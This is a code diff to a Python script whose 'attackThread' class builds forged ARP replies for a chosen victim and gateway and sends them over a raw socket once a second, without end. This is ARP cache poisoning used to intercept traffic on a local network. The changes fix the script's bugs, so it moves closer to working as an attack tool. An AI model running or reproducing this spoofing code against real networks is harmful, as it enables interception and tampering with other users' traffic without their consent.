@@ -1,6 +1,5 @@
 #!/usr/bin/python3
 
-
 import re
 import os
 import sys
@@ -30,7 +29,7 @@ class attackThread(threading.Thread):
 		threading.Thread.__init__(self)
 		self.victim = victim
 		self.gateway = gateway
-		self.mac = mac
+		self.mac = mac.encode()
 		self.connect = connect
 
 		# Other
@@ -44,37 +43,41 @@ class attackThread(threading.Thread):
 		epacket1 = victim_mac + self.mac + self.arp
 		epacket2 = gateway_mac + self.mac + self.arp
 
-		gip = socket.inet_aton(gateway_ip)
-		vip = socket.inet_aton(victim_ip)
+		gip = socket.inet_aton(self.gateway)
+		vip = socket.inet_aton(self.victim)
 
-		victim_arp = epacket1 + self.protocol + mac + gip + victim_mac + vip
-		gateway_arp = epacket2 + self.protocol + mac + vip + gateway_mac + gip
+		victim_arp = epacket1 + self.protocol + self.mac + gip + victim_mac + vip
+		gateway_arp = epacket2 + self.protocol + self.mac + vip + gateway_mac + gip
 
 		while True:
 			self.connect.send(victim_arp)
-			print(" Packet send to " + victim_ip)
+			print(" Packet send to " + self.victim)
 			self.connect.send(gateway_arp)
-			print(" Packet send to " + gateway_ip)
+			print(" Packet send to " + self.gateway)
 			time.sleep(1)
-		
 
-	def get_mac(local_ip):
+
+	def get_mac(self, local_ip):
 		pid = Popen(["arp", "-n", local_ip], stdout=PIPE)
-		s = pid.communicate()[0]
-		mac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", s).groups()[0]
+		spid = pid.communicate()[0].decode()
+		local_mac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", spid).groups()[0]
 
-		return mac
+		return local_mac
 
 
 def attack(ips):
+	global threads, mac
+
 	for ip in ips:
-		threads.append(attackThread(gateway_ip, ip, mac.encode()))
+		threads.append(attackThread(gateway_ip, ip, mac, s))
 
 	for th in threads:
 		th.start()
 
 
 def main():
+	global interface, mac, s, victims
+
 	if interface in get_interfaces():
 		mac = get_mac(interface)
 		s.bind((interface, socket.htons(0x0800)))
